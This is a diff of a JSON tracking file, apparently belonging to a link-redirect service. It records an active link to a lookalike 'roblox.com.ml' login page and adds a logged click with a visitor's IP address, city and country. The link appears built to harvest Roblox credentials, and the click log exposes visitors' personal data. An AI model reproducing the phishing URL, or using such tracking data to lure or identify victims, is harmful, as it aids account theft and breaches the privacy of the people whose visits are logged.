@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 455,
+    "useCount": 456,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3752,6 +3752,14 @@
         "city": "Puebla City",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777068649409,
+        "ip": "190.193.141.180",
+        "country": "Argentina",
+        "city": "Buenos Aires",
+        "flag": "🇦🇷",
+        "countryCode": "AR"
       }
     ]
   },
